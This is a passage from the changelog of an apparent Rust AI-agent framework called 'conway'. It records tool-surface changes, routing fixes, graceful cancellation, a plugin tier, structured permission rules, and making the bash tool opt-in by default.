  dev-dependency, whose only consumer was the relocated tests.
  (`crates/conway-core/src/failure.rs`, `crates/conway-core/src/capabilities.rs`,
  `crates/conway-core/src/lib.rs`, `crates/conway-routing/src/config.rs`,
  `crates/conway-routing/src/router.rs`, `crates/conway-routing/src/prober.rs`,
  `crates/conway-routing/src/lib.rs`, `crates/conway-runtime/src/attempt.rs`,
  `crates/conway-runtime/src/runtime.rs`, `crates/conway-runtime/src/agent_loop.rs`,
  `crates/conway/src/builder.rs`)

- **`conway_subagent` is split into `conway_fork` and `conway_spawn`**
 , settling the fork-vs-spawn
  choice by tool name rather than by a `mode` argument, exactly as
  `PHILOSOPHY.md`'s "Choosing between them" section has always described.
  **This is a breaking change to the model-facing tool surface**: a config,
  allowlist, or scripted backend that names `conway_subagent` (in
  `--allowed-tools`, `tools.builtin_plugins` selectors, or a permission
  pattern) must be updated to name `conway_fork` and/or `conway_spawn`
  instead — `conway_subagent` no longer exists as a registered tool.
  `conway_fork`'s `prompt` is documented solely as a directive to a child
  that already holds this agent's context; `conway_spawn`'s solely as a
  complete statement of a task to a child that has none — the two field
  descriptions that used to have to explain themselves per mode are now two
  honest, independent schemas. `budget`, `tools`, `result_contract`, and
  `await` remain on both, and argument range-checking (an out-of-range
  `deadline_secs` mapping to `ToolError::InvalidArguments`, never a panic)
  is preserved on both. `SubagentSpec` (the port `conway-core`/
  `conway-runtime` share) is unchanged — it keeps its own `mode` field;
  only the tool layer split. Also unblocks (whether a fork should inherit the parent's
  `agent_def`) without deciding it: two tools let each answer for itself
  instead of one optional field having to behave sensibly for both.
  (`crates/conway-tools/src/subagent/{tools,mod}.rs`, `README.md`,
  `docs/agents.md`, `docs/sessions.md`, `docs/scripting.md`)

- **`conway routes explain` stays honest when the router was supplied from
  outside `conway-routing`**. Before
  this item, `ExplainReport` (and its field types -- `ExplainEntry`,
  `EntryOutcome`, `CapabilitySummary`, `BreakerSnapshot`) were defined only
  in `conway-routing`, reachable exclusively through `RoutingExplain`'s
  projection of a concrete `DeclarativeRouter`; a `Router` injected via
  `ConwayBuilder::with_router` had no way to produce one at all, so
  `Conway::explain_routing` fell back to a fabricated-empty report, and
  `conway routes explain <role>` -- which inferred "unknown role" from
  `report.entries.is_empty()` -- printed that lie for every correctly
  configured role (a silent behavioral inversion, not a compile
  error). The five types move, verbatim, to `conway_core::routing`
  (`conway-routing` and the `conway` facade both re-export them under the
  same names for source compatibility -- no consumer-visible shape change).
  `conway-core` gains a new `RoutingExplainer` port (`fn explain(&self, req:
  &RouteRequest) -> ExplainReport`), deliberately separate from `Router`
  (which keeps its one method, `resolve`, so every existing
  `.with_router(..)` call site across the workspace keeps compiling
  untouched) plus two production-only fallback implementations,
  `MinimalRouter` and `AlwaysClosedHealthRegistry` -- config-only, no
  capability filtering, no health filtering, no invented values: one
  `ExplainEntry` per configured chain candidate, `capabilities: None`,
  `breaker: BreakerSnapshot { state: Closed }`. `Conway::explain_routing`
  now falls back to `MinimalRouter`, projected over this `Conway`'s own
  resolved `RoutingConfig`, instead of the old fabricated-empty report.
  `commands::routes::run`'s unknown-role detection now reads
  `conway.config().roles` directly rather than inferring emptiness, so a
  configured role prints its (possibly degenerate) report instead of an
  "unknown role" error regardless of which `Router` produced it.
  (`crates/conway-core/src/routing.rs`, `crates/conway-core/src/ports/routing.rs`,
  `crates/conway-core/src/ports/mod.rs`, `crates/conway-routing/src/explain.rs`,
  `crates/conway-routing/src/lib.rs`, `crates/conway/src/lib.rs`,
  `crates/conway/src/conway.rs`, `crates/conway/src/builder.rs`,
  `crates/conway-cli/src/commands/routes.rs`, `docs/routing.md`)

### Added

- **Graceful cancellation is now reachable, and immediate stays the default**
  :
  `PHILOSOPHY.md` has described a `TERM`/`KILL`-style soft/hard cancellation
  contract since it was written, but no production code ever constructed the
  soft form — every reachable cancellation, from `conway_cancel` down to
  `Runtime::cancel`, was hard. `conway_cancel` gains a `mode` argument
  (`immediate`/`graceful`, defaulting to `immediate` — no existing caller is
  silently downgraded), `SubagentHost::cancel` gains a `CancelMode` parameter
  threaded from there down to `AgentMessage::Cancel`'s pre-existing `hard`
  flag, and `SessionHandle::cancel_with(target, reason, CancelMode)` is the
  new embedder-facing primitive `SessionHandle::cancel` now delegates to
  (unchanged, immediate). A graceful cancel lets the target finish its
  in-flight turn and stops only that agent — it does not itself cancel
  descendants (tracked separately as)
  — and cannot reach an agent idling at the resume gate between turns (an
  idle `keep_alive` agent, or a resumed root's first iteration), which is
  now stated on the tool, the facade, and `docs/agents.md`'s control-surface
  table rather than left implicit.

### Fixed

- `conway_cancel`'s own doc comment in
  `crates/conway-tools/src/subagent/control.rs` claimed cancelling "carries
  an agent id and a mode" over a `CancelArgs` with no such field — a
  declaration/behavior mismatch fixed by the `mode` addition above, not
  merely by editing the comment.

- **The first-party plugin tier now has a settled shape**: `PHILOSOPHY.md` names a second tier of
  plugins — dynamic routing, compaction, memory, skills, MCP — written and
  shipped in this repository but never installed by default, and until now
  none of it existed. Four decisions, made once so the members that follow
  are ordinary work: (1) one crate per plugin under `crates/`, and `conway`
  (the facade) never depends on any of them — a first-party plugin is
  written against `conway::plugin`, the same public surface a third party
  gets; (2) installed through a new, distinct `plugins.install` key in
  `settings.json` (deliberately not folded into `tools.builtin_plugins`,
  which names only the closed conway-tools built-in set), resolved by
  whatever binary or embedder links the plugin crate — `conway-cli` does
  so in `crates/conway-cli/src/first_party_plugins.rs`, feeding the TUI and
  one-shot `-p` from the same config; (3) versioned with the workspace, not
  independently, and not held to `conway-core`'s own strict-semver
  discipline; (4) discoverable from `README.md`'s "First-party plugins"
  section, which now describes what exists rather than what is planned.
  `crates/conway-plugin-skeleton` ships as the tier's first member: a
  worked, non-default example plugin (`skeleton_ping`) proving the
  mechanism end to end, not a real capability. `ConwayBuilder` gains a new
  `config()` accessor so a caller can read `plugins.install` before
  deciding which plugin to attach.

### Removed

- **BREAKING: the periodic health prober is retired, not wired — the
  independent `Probe` circuit breaker it fed, and the four `[health]`
  config keys that tuned it, are gone** (, "retire the health prober"). The operator
  ruled on the deferred question this project had carried since the
  prober was first labeled a forward declaration: `HealthProber`
  (`conway-plugin-routing`) never had a production call site — no code in
  `conway`, `conway-runtime`, or `conway-cli` ever spawned it — and it
  fixed no correctness gap. A crashed endpoint recovering is already
  detected without it: the Transport breaker's `HalfOpen` state derives
  from the clock at read time (no background task needed), and the router
  admits a half-open candidate exactly like a closed one, so the next real
  request against a role naturally retries a recovered endpoint. What
  probing bought was shaving one failed round trip off recovery latency
  for a sparse-traffic role — an optimization, and this project gates
  optimizations on a measured baseline that did not exist and was not
  scheduled; waiting indefinitely for a number nobody would produce is how
  "not now" becomes "never" without anyone deciding, so it was decided.
  `BreakerKind::Probe`, `Observation::ProbeFail` (its only producer),
  `EndpointBreakers.probe`, and `RoutingReason::HealthSkip`'s ability to
  name a `Probe` breaker are all gone — `BreakerKind::Transport` is now the
  only variant, and `BreakerRegistry::merged_state`/`snapshot` degenerate
  to a direct passthrough of the one remaining breaker rather than leaving
  a labeled-but-dead second arm beside a live one. `conway routes explain`
  now only ever renders a `transport` breaker kind.
  **Breaking:** `[health].probe_enabled`, `probe_interval_secs`,
  `probe_timeout_secs`, and `probe_failures_to_open` no longer exist on
  `conway_core::routing::HealthConfig` or its facade mirror
  (`conway::config::schema::HealthSection`, which keeps
  `#[serde(deny_unknown_fields)]`); a `settings.json` that previously
  loaded while naming any of them under `[health]` now fails to load,
  naming the offending key, rather than silently accepting and ignoring
  it. `docs/routing.md`'s "Health and failover" section and
  `ARCHITECTURE.md` now describe one breaker, not two.
  (`crates/conway-plugin-routing/src/breaker.rs`,
  `crates/conway-plugin-routing/src/lib.rs`,
  `crates/conway-plugin-routing/src/config.rs`,
  `crates/conway-plugin-routing/tests/router_resolution.rs`,
  `crates/conway-core/src/routing.rs`,
  `crates/conway/src/config/schema.rs`, `crates/conway/src/config/merge.rs`,
  `crates/conway/tests/config_precedence.rs`,
  `crates/conway-cli/src/commands/routes.rs`, `docs/routing.md`,
  `ARCHITECTURE.md`, the philosophy debt ledger (since retired to the board,
  2026-08-13); deleted
  `crates/conway-plugin-routing/src/prober.rs`)

## [0.8.0] — 2026-08-06

**Seven of the entries below are one piece of work.** A declaration audit
found the same defect in seven places — a declared surface that did not
match the behavior behind it — and fixed them together. The breaking
changes among them (`SubagentSpec::cache_hint` and `ForkSpec::cache_hint`
removed, the `anthropic`/`openai-compat` cargo features retired,
`SessionStatus` and the `sessions` `STATUS` column removed,
`TruncationPolicy::Artifact` removed) all come from that sweep, so a
migration is best read as one change rather than five. Two of the seven
went the other way and made a declared capability real instead of removing
it: agent-def `result_contract` is now enforced, and per-role capability
floors are now settable. One was resolved by labeling rather than either —
`probe_enabled` now defaults to `false` and says plainly that the health
prober is not yet wired.

### Added

- **`roles.<alias>` gains a per-role capability floor:
  `tool_calling`/`structured_output`/`parallel_tool_calls`/`reasoning`/
  `min_reliability`/`min_context`.** Previously `ConwayConfig::routing()`
  hardcoded `RequiredCaps::default()` (every capability field `None`) for
  every role regardless of what a config author wrote, so nothing
  enforced these floors — a chain pointing a tool-using role at a
  model with no tool support was accepted in silence. Closing the gap took
  two changes: `RoleEntry` now carries these six fields (all optional,
  defaulting to "no requirement" exactly like `RequiredCaps` itself, so an
  existing config with none of them set is unaffected) and
  `ConwayConfig::routing()` maps them into `RequiredCaps`; separately,
  investigation found `DeclarativeRouter` never actually read a role's
  `RequiredCaps` at all (`CompiledRole` did not carry it, and admission
  consulted only the caller-supplied `RouteRequest.required`), so the
  schema mapping alone would have had zero effect on any real turn — the
  router now merges the role's configured floor with the request's own
  `required` per candidate, taking the pointwise strictest of the two
  (`crates/conway-routing/src/capability.rs`'s new `strictest`,
  `DeclarativeRouter::effective_required`). `tool_calling`'s wire
  vocabulary (`"none"` | `"non_streaming"` | `"streaming"` |
  `"streaming_validated"`) is a facade-local `ToolCallSupportSpec`, not
  `conway_core::capabilities::ToolCallSupport` directly — that type's
  `Streaming { validated: bool }` struct variant is awkward to hand-write
  in JSON, and `conway-backends`' own `ToolCallSupportSpec` (which solves
  the identical problem for `models.json`) can't be reused since
  `conway-backends` is an optional dependency. Proven end to end at both
  layers: a role whose configured floor a candidate model does not meet is
  rejected by admission, not merely parsed. (`crates/conway/src/config/
  schema.rs`, `crates/conway-routing/src/router.rs`, `crates/conway-routing/
  src/capability.rs`, `docs/routing.md`, `crates/conway/tests/
  role_capability_floor_seam.rs`, `crates/conway-routing/tests/
  router_resolution.rs`)

- **`ForkSpec` gains the ephemeral-ask shape; `conway::plugin` gains `Fact`,
  `CwdError`, and `SubagentError`.** `ForkSpec::ephemeral`/
  `ForkSpec::ask_origin` let an embedder express the `/ask`-style
  "fork, but keep it out of the default session listing" shape
  (`SessionMeta` visibility, not a third subagent mode — `ask` is
  fork+await-text, built on top of fork) through the public facade, instead
  of only through the two in-tree ask paths (the TUI modal and the
  `conway_ask` tool). Both fields default to today's non-ask behavior
  (`false`/`None`) and thread through `From<ForkSpec> for
  conway_core::agent::SubagentSpec` unchanged when unset. **Ask is
  fork-only: `SpawnSpec` gets neither field**, so a caller cannot
  even express "spawn with an ask origin" — the combination is ruled out by
  the type it would have to be written on not existing, not by a runtime
  check. `conway::plugin` separately gains three types the report tool,
  the `cd` tool, and any `SubagentHandle`-driven tool need to be
  facade-buildable at all: `Fact` (a typed fact a tool contributes to an
  agent's result — previously nameable only as `AgentResult.facts`'
  element type, never as a local variable's own type), `CwdError` (`ctx.
  chdir`'s error type), and `SubagentError` (`ctx.subagents`'s error type,
  added alongside `SubagentHandle` itself). All three are pinned by name in
  `crates/conway/tests/plugin_surface.rs`, closing the gap that module's
  own doc comment named as open. (`crates/conway/src/subagent_spec.rs`,
  `crates/conway/src/lib.rs`, `crates/conway/tests/plugin_surface.rs`)

- **The structured rule form: general rules for tool use.** A
  `permissions.json` file's flat `allow`/`deny` lists are now the surface
  syntax for a more general `Rule { select, when, then }` form, added as an
  optional `rules` array alongside them. The flat form desugars into the
  same `Rule` (`PatternRule::to_rule`) and is evaluated by the same path, so
  `bash:git status` and
  `{ "select": { "tools": ["bash"] }, "when": { "command_prefix": "git status" }, "then": "allow" }`
  produce byte-identical decisions — proven by a matrix test in
  `permission_pattern::f12_tests` and a real-stack seam in
  `crates/conway/tests/structured_rule_seam.rs` that drives the genuine
  `Conway::load_permission_files` → `PermissionBroker::decide` path. The
  `rules` array expresses what the flat form cannot: `paths_under(prefix)`
  authorizes/denies a call whose declared path arguments resolve under a
  directory (read from `call.arguments` via the same
  `resolve_like_the_tool_will` + `CanonicalRoot::contains` the confinement
  root already uses — no new trusted code, never the sanitized rendering);
  `categories([ToolCategory...])` and `category_in([...])` select by
  declared category; and a `prompt` effect that forces the gate over a
  matching `allow` grant. The five security traps are each pinned by a real-path
  seam test (real tools → real `ToolRunner` → real `PermissionBroker`, asserting
  on observable gate-reach outcomes): `paths_under` never reads the lossy `rendered`;
  `PathArgs::Unconfinable` never satisfies `paths_under` (fail closed);
  `command_prefix` on a `Structured`-rendering tool is a typed
  `RuleRegistrationError` surfaced in `PermissionLoadReport` rather than a
  silent inert rule; the allow-side metacharacter gate applies to every
  `when` unchanged (a chained command never auto-allows); and `deny`/`prompt`
  rules install from every file unconditionally while `allow` still requires
  an explicit trust decision for a project file. Composition is two stages
  (deny/prompt admit unconditionally, allow only when trusted; then
  most-restrictive-wins: deny beats prompt beats allow, no priority numbers).
  The flat form stays the ergonomic default; the `rules` array is the
  additive superset. (`crates/conway-core/src/permission_pattern.rs`,
  `crates/conway-runtime/src/permission.rs`, `crates/conway/src/conway.rs`,
  `docs/permissions.md`, `.design/extension-architecture.md` §9.5)

- **`conway::plugin`: the facade's curated extension surface — `Tool`,
  `Plugin`, and `ContextHook` are now implementable by a crate that depends
  on `conway` alone.** The port traits were re-exported at the crate root
  from the start, but the types their method signatures name (`ToolCtx`,
  `ToolCall`, `ToolOutput`, `ToolSpec`, `ToolError`, `PathArgs`,
  `RenderKind`, `PluginManifest`, `ContextPayload`, `ContextHookCtx`,
  `OverflowInfo`, …) were not, so an external crate could name `Tool` and
  could not write `fn invoke(&self, call: ToolCall, ctx: ToolCtx) -> …` —
  and `ContextHook` was not exported at all, leaving the public
  `ConwayBuilder::with_context_hook` accepting a type no external caller
  could name. `pub mod plugin` re-exports exactly the authoring surface
  (the three traits, their signature types, the field types of the structs
  an implementor constructs, the `PluginConfig`/`CancellationToken` handles
  the built-in tools themselves name, and the `async_trait` macro);
  `ContextHook` also joins the crate-root port re-exports. `CwdHandle`,
  `EventSinkHandle`, `SubagentHost`, and `EventSink` stay unexported on
  purpose — they are `ToolCtx` fields an implementor reads but never names,
  and the extension design rejects plugin implementations of the latter two
  (`.design/extension-architecture.md` §13.5). Liveness is proven by
  `crates/conway/tests/plugin_surface.rs`, which implements a trivial
  `Tool`/`Plugin`/`ContextHook` with no `conway_core` import, registers
  them through `ConwayBuilder`, and fails to *compile* if the export set
  ever shrinks. (`crates/conway/src/lib.rs`,
  `crates/conway/tests/plugin_surface.rs`, `docs/embedding.md`)

- **Rule registration errors are now operator-visible in the TUI.** A rule
  that can never match (today: `command_prefix` paired with a
  `Structured`-rendering tool — every built-in except `bash`) has produced a
  typed `RuleRegistrationError` in `PermissionLoadReport` since the
  structured rule form landed, but the TUI consumed only the report's
  notices and paths and dropped the errors on the floor — the silent-inert
  failure the errors were created to flag. The TUI now pushes one transcript
  error per registration error at startup, naming the rejected rule and the
  reason and rendered in the error severity (`Entry::Error`, red) rather
  than as a routine cyan notice, so a refused rule cannot be skimmed past —
  and every registration-error variant added later is operator-visible
  the moment the loader produces it. The acceptance test asserts on the
  observable transcript and rendered screen, not on the report field the
  producer writes. (`crates/conway-cli/src/tui/app.rs`,
  `docs/permissions.md`)

- **The permission prompt's `[p]` offer is render-kind-aware, and remembered
  grants can be scoped to one agent or one subtree.** Two halves of the same
  prompt. (1) The offer now consults the proposing tool's `RenderKind`: for
  a tool whose rendering is a structured JSON dump (every built-in except
  `bash`), a `command_prefix` rule could never be registered, so the prompt
  no longer pretends to offer one — it offers the `tool:*` wildcard instead,
  metacharacters in a JSON dump no longer suppress the offer, and the prompt
  states the exact grant in words (the `[p] grants:` line) before you press
  anything. The shell side is unchanged: the metacharacter gate still
  declines unsafe prefixes for `bash`. (2) A new `[s]` key cycles the scope
  remembered-grant keys (`[a]`/`[p]`) grant at: this session (the default) →
  this agent only → this agent and its subtree, resetting to session for
  every new prompt so narrowing is always deliberate. The broker has honored
  all three scopes since they were built; every production site hardcoded
  session until now. Per-agent and per-subtree grants are never written to
  `permissions.json` (they name live agent ids, meaningless at restart), and
  the facade exposes the same scoped grants to library embedders. The
  negative cases are proven end to end in
  `crates/conway/tests/permission_scope_seam.rs`: a per-agent grant does not
  authorize a sibling's identical call, and a subtree grant does not
  authorize an agent outside the subtree. (Operator: wire the scopes, do not remove them.)
  (`crates/conway-core/src/permission_pattern.rs`,
  `crates/conway-cli/src/tui/input.rs`,
  `crates/conway-cli/src/tui/view/mod.rs`, `crates/conway/src/conway.rs`,
  `crates/conway/tests/permission_scope_seam.rs`, `docs/permissions.md`)

- **`/settings` now shows every active deny and prompt rule, with its
  origin.** Deny and prompt rules install from any permissions file,
  trusted or not — that asymmetry is the sound part of the model (a cloned
  repo cannot grant itself allow authority, but a safety rule works the
  moment it is written) — yet until now no surface listed them: you could
  audit what a repo *granted* you, but not what it *denied* or *prompted*
  you. The permissions group now has three sections — **allow** (the
  existing grant list, unchanged, still per-rule revocable), **deny**, and
  **prompt** — each deny/prompt row rendered `[origin] description`, flat
  and structured rules alike. The rows are read-only on purpose: the
  cursor skips over them (a new `MenuNode::Static` row kind in the menu
  primitive), because deny/prompt only ever narrow and a safety rule
  offering one-keystroke removal is the wrong shape. The untrusted-file
  case — the one this exists for — is proven end to end in
  `crates/conway-cli/src/tui/app.rs::untrusted_file_deny_and_prompt_rules_are_visible_in_settings`,
  which drives a real `.conway/permissions.json` through the real
  `App::new` loader and asserts on the rendered rows. The facade gains
  `Conway::active_structured_deny_rules` /
  `active_structured_prompt_rules` (the flat deny/prompt accessors already
  existed). (`crates/conway/src/conway.rs`,
  `crates/conway-cli/src/tui/view/menu.rs`,
  `crates/conway-cli/src/tui/view/settings.rs`,
  `crates/conway-cli/src/tui/state.rs`,
  `crates/conway-cli/src/tui/app.rs`, `docs/permissions.md`,
  `docs/interactive.md`)

- **Structured allow rules are now visible in `/settings` and individually
  revocable.** A `rules`-array allow rule (the structured form —
  `paths_under`, `categories`, `category_in`, multi-tool) was enforced by
  the broker but invisible to the operator: the review list dropped it
  (the flat accessor projects every rule through `to_pattern_rule()`, which
  is `None` for the structured-only forms), and revoking one returned
  `NotFound` because the flat revoke is keyed on that same projection — the
  only way to remove one was "revoke all grants" or editing the file by
  hand. The allow section now renders each structured allow rule alongside
  the flat grant rows, `[origin] description`, with a `scope:` note when
  the grant covers less than the whole session; selecting the row and
  pressing `Enter` revokes exactly that rule — from the session *and* from
  the `rules` array of the file it came from, with the same
  never-fails-open ordering and re-trust behavior as flat revocation. The
  facade gains `Conway::active_structured_allow_rules` (rule + origin +
  grant scope, via the newly public `GrantScope`) and
  `Conway::revoke_structured_allow_rule`, backed by the broker's
  Rule-identity `revoke_pattern_rule`; the existing flat grant list and
  flat per-rule revocation are unchanged. The observable outcome is proven
  end to end in
  `crates/conway/tests/structured_rule_seam.rs::revoking_a_structured_allow_rule_removes_only_it_and_the_call_asks_again`:
  after the revoke, a call the rule used to authorize reaches the
  operator's gate again while a sibling flat grant still auto-allows, and
  the rule's wire form is gone from the file. (`crates/conway-runtime/src/permission.rs`,
  `crates/conway/src/conway.rs`, `crates/conway-cli/src/tui/view/settings.rs`,
  `crates/conway-cli/src/tui/input.rs`, `crates/conway-cli/src/tui/state.rs`,
  `crates/conway-cli/src/tui/app.rs`, `docs/permissions.md`)

- **The `cd` tool is documented in the operator-facing docs.** `docs/agents.md`
  gains a "The `cd` tool" section next to `--cwd`/`--root`: what it does
  (moves the agent's working directory), the next-batch effect (a `cd`
  alongside a `read` in one batch does not move that `read`), the per-call
  `cwd` argument as the one-off alternative, the session-start invariant,
  and that its declared `path` argument is confined by the agent's root
  (`Move` category, which plan mode does not permit). Previously the tool
  appeared only in this changelog. (`docs/agents.md`)

### Security

- **BREAKING: bash is no longer registered by default.** `ConwayBuilder::
  build()` used to unconditionally register all four built-in plugins
  (`conway.fs`, `conway.shell`/bash, `conway.subagent`, `conway.report`)
  whenever the `builtin-tools` feature was compiled in, with no runtime way
  to decline any one of them — conway's most dangerous built-in (arbitrary
  shell execution) installed itself, and the only escape was compiling out
  the feature entirely, which also removed `fs`/`subagent`/`report`.
  Registration is now declarative and selective: `ConwayBuilder::
  with_builtin_plugins(PluginSelection)` filters the built-in candidate set
  by manifest id (`All`, `None`, `Only([..])`, `AllExcept([..])`) — the
  SAME id-keyed mechanism a bundle of third-party plugins would use for
  identical selection UX (no bespoke built-in-only switch). Not
  calling it defers to the new `tools` config section
  (`ConwayConfig::tools.builtin_plugins`, a plain `Vec<String>` of manifest
  ids), which **defaults to every built-in EXCEPT `"conway.shell"`.**
  Obtaining bash now requires a deliberate act: add `"conway.shell"` to a
  loaded `settings.json`'s `tools.builtin_plugins` array, or call
  `.with_builtin_plugins(PluginSelection::All)` (or an `Only`/`AllExcept`
  naming it) before `.build()`.

  **Who is affected, and how:**
  - **Library embedders and the interactive TUI** now get a `Conway` with
    NO `bash` tool in the registry by default — a build that used to be
    able to run shell commands out of the box now cannot, until one of the
    opt-ins above is taken. The TUI's own opt-in is the `settings.json` key
    above (`docs/getting-started.md`, `docs/interactive.md`).
  - **One-shot (`conway -p`) is UNCHANGED.** `conway-cli`'s own
    `build_conway` always passes `PluginSelection::All` for every
    non-interactive dispatch target (`-p`, `sessions`, `routes`) — bash was
    already, and remains, gated purely by `--allowed-tools`/
    `--permission-mode` (an empty allow-list by default), not by
    registration; this item did not change that gate.
  - **Plugins injected via `ConwayBuilder::with_plugin` are unaffected** —
    that call is already the explicit, per-plugin declaration this project
    requires of a third party, so the built-in selection never filters it,
    default or not.
  - **`fs`/`subagent`/`report` stay registered by default**, a deliberate
    choice, not an oversight: none is a general-purpose arbitrary-code-
    execution primitive the way bash is, each is load-bearing for conway's
    own out-of-the-box usability (no filesystem tool means no code
    editing), and each was already gated by the same invocation-time
    `permissions.mode`/`--allowed-tools` check bash always was —
    registration was never the actual gap for those three.

  (`crates/conway/src/builder.rs`, `crates/conway/src/config/schema.rs`,
  `crates/conway/src/presets.rs`, `crates/conway/src/lib.rs`,
  `crates/conway-cli/src/main.rs`, `crates/conway/tests/builder.rs`,
  `docs/getting-started.md`, `docs/interactive.md`, `README.md`)

### Changed

- **`[health].probe_enabled` now defaults `false`, and every `probe_*`
  `[health]` key is labeled as not yet implemented.** Investigation
  found `conway-routing::HealthProber` — the periodic prober these keys
  configure — has no production call site anywhere in the tree; the
  Transport breaker alone handles recovery today (a clock read takes it
  half-open, the next real request retries), so wiring the prober is a
  latency optimization pending a measured baseline, not a shipped
  correctness fix. A default-`true` `probe_enabled` therefore asserted a
  behavior no fresh install actually got. The prober itself, `BreakerKind::
  Probe`, `Observation::ProbeFail`, and the config keys are all still
  present — this is a forward declaration, not a deletion — and wiring is
  tracked by a separate Do not confuse this with the
  already-wired startup `models.probe_on_startup` capability probe,
  a different mechanism. (`crates/conway-core/src/routing.rs`,
  `crates/conway/src/config/schema.rs`, `crates/conway-routing/src/prober.rs`,
  `crates/conway-routing/src/lib.rs`, `docs/routing.md`)

- **`CliOverrides`'s doc comment no longer claims `conway-cli` sources it.**
  The struct was documented as "mirrored here (not in `conway-cli`) so the
  library is the source of truth" — but `conway-cli` never constructs one;
  `grep -rn "with_cli_overrides" crates/` finds only the definition and two
  test files. `conway-cli` uses its own, separate bespoke flag-to-config
  wiring. `CliOverrides` remains a real, tested, embedder-facing override
  API (`LoadOptions::cli_overrides`, `ConwayBuilder::with_cli_overrides`) —
  only the doc comment's claim about who calls it was false, and is now
  corrected; no behavior changed. Reconciling the two wiring paths is a
  separate, not-yet-decided architectural question. (`crates/conway/src/
  config/merge.rs`)

- **A rejected subagent spec (a bad `cwd`/`root` on a spawn, or a resumed
  root's cwd escaping its persisted root) is now classified as
  `ToolError::InvalidArguments`, not `Internal`.** Note on today's reach: no
  model-invoked tool exposes `cwd` or `root` (they stay embedder-only),
  so this classification is currently observable from the facade/embedder path
  — `SessionHandle::spawn`/`fork`, or a direct `SubagentHandle` caller — and
  not yet from a model tool call. The path is wired and proven end to end, so
  it is correct the day a tool argument does reach it. `conway_core::error::
  RuntimeError` gains a new `InvalidSpec { detail }` variant, filling the gap
  `conway-runtime`'s `subagent.rs` module doc previously confessed did not
  exist; its `invalid_spec` helper (used by both `SubagentHost::start` and
  `resume_root`) now constructs it instead of smuggling the rejection through
  `RuntimeError::Tool(ToolError::Internal)`. `conway_core::ports::subagent::
  translate` (the one place a `RuntimeError` becomes a `SubagentError`) maps
  it to a new `SubagentError::InvalidSpec`, which `From<SubagentError> for
  ToolError` in turn maps to `InvalidArguments` alongside the three existing
  caller-mistake variants — so a spec rejection now reads as a correctable
  mistake in the caller's own data, not a host bug. Two OTHER "closest fit"
  `Internal` mappings in the same crate (`tree.rs`'s `already_attached`,
  `WeakRuntimeHost::upgrade`'s "runtime already dropped") are deliberately
  UNCHANGED: neither is a rejection of caller-supplied spec data. A confessed
  gap between the runtime and the tool boundary meant every one of these
  rejections previously surfaced identically to a genuine infrastructure
  failure; there is no other behavior change. (`crates/conway-core/src/
  error.rs`, `crates/conway-core/src/ports/subagent.rs`, `crates/conway-runtime/
  src/subagent.rs`, `crates/conway-runtime/src/runtime.rs`)
- **The three control-character sanitizers are converged to one shared
  home, and `ToolOutcome::error` now sanitizes at construction.** The
  replace-semantics sanitizer that the runtime's `rendered` seam
  (`runner::sanitize_rendered`) and the permission-pattern test fixtures
  kept as hand-copies of each other (the "KEEP IN SYNC" hazard at
  `permission_pattern.rs:362`) is now a single function in
  `conway_core::text::sanitize_control_chars`, with `SANITIZED_CONTROL_
  PLACEHOLDER` as a single shared constant the gate and the sanitizer
  literally reference. The gate's behavior is unchanged:
  `contains_shell_metacharacters` still treats `SANITIZED_CONTROL_
  PLACEHOLDER` as a metacharacter (so a control char laundered into the
  placeholder cannot pass the gate), pinned by a new test that fails the
  moment that property is broken. `ToolOutcome::error` — the construction
  seam for the runner-synthesized error strings (preflight denies, an
  `invoke` error, a panic) that flow into model context — now sanitizes its
  `Text` block at construction, so every synthesized error path is covered
  by construction rather than by each caller remembering to call it. A
  tool's own output (including `is_error: true` from a non-zero `bash`
  exit) is a separate surface, passed through verbatim as data the model
  reads; sanitizing it would corrupt its legitimate `\n`/`\t` structure.
  The TUI's `sticky_prompt_text` (`header.rs`) deliberately stays on
  its `filter` (drop) semantics: that site measures display width to
  truncate, where replacing a zero-width control char with a width-1
  `U+FFFD` would inflate the measured width and truncate early; a comment
  at the site now states why so the next reader does not "deduplicate" it
  onto the shared replace helper. This is an internal refactor of the
  v0.5.0 bug class (a safe-looking transformation sitting before a
  security check); no user-visible behavior change, no docs change.
  (`crates/conway-core/src/text.rs`,
  `crates/conway-core/src/permission_pattern.rs`,
  `crates/conway-runtime/src/tools/runner.rs`,
  `crates/conway-cli/src/tui/view/header.rs`)

- **A built-in subagent tool naming an unknown/foreign agent id now fails
  with `InvalidArguments`, not `Internal`.** `conway_steer`/`conway_await`/
  `conway_cancel`/`conway_subagent`/`conway_ask` all call
  `ToolCtx::subagents` (`SubagentHandle`), which since C1 already
  narrows every `RuntimeError` a call can produce to `SubagentError`; this
  item deletes `conway-tools`' own `host_error` helper, which used to flatten
  every one of those into `ToolError::Internal` regardless of cause. Now
  `conway-core`'s `From<SubagentError> for ToolError` is called directly at
  every call site: an unknown `agent_id`, an `agent_id` outside the calling
  agent's own subtree (e.g. a sibling), or a malformed `SubagentMode`
  reaching `conway_ask` are all caller mistakes a model can see and correct,
  so they now surface as `ToolError::InvalidArguments` (naming the offending
  id(s)) instead of a generic `Internal` failure that misleadingly read as a
  host bug. Only genuine host/infrastructure failure
  (`SubagentError::Host`) still maps to `Internal`. No behavior change for
  the legitimate path (an agent acting on its own subtree). (`crates/
  conway-tools/src/subagent/{tools,ask,control}.rs`,
  `crates/conway-tools/tests/subagent.rs`)

### Removed

- **`SubagentSpec::await_result` is gone.** The field was write-only: every
  fork/spawn constructor and call site set it, but nothing in `conway-runtime`
  ever read it — whether a fork/spawn caller blocks for the child's result is
  decided entirely by the caller's own control flow (e.g. `conway-tools`'
  `conway_subagent` tool's local `await` argument, which is unaffected and
  still decides whether to call `SubagentHost::await_result`). `SubagentSpec`
  is never durably persisted (only its *derived* fields — `mode`, `agent_def`,
  `ephemeral`, `ask_origin`, `cwd`/`root`, `result_contract` — are ever
  projected onto `SessionMeta`/events), so this is a plain field removal, not
  a legacy-deserialize change. (`crates/conway-core/src/agent.rs`,
  `crates/conway/src/subagent_spec.rs`, `crates/conway/src/session_handle.rs`,
  `crates/conway/src/intent.rs`, `crates/conway-tools/src/subagent/tools.rs`,
  `crates/conway-tools/src/subagent/ask.rs`)
- **`SubagentSpec::cache_hint` and `ForkSpec::cache_hint` are gone.** The
  sibling field `await_result`'s deletion (above) flagged as a follow-up:
  every fork/spawn constructor and call site set it, but nothing anywhere in
  the workspace ever read it back to change behavior — `conway-runtime`'s
  `SubagentHost::start` hardcodes `AgentSpec::cache_mode: CacheMode::None`
  for every fork/spawn child regardless of `spec.cache_hint`, and the real
  cache-hint attachment (`attempt.rs`'s `attach_route_cache_hints`) runs
  post-routing, keyed on the resolved model's `Capabilities::cache`, with no
  reference to `SubagentSpec` at all. (Do not confuse this with
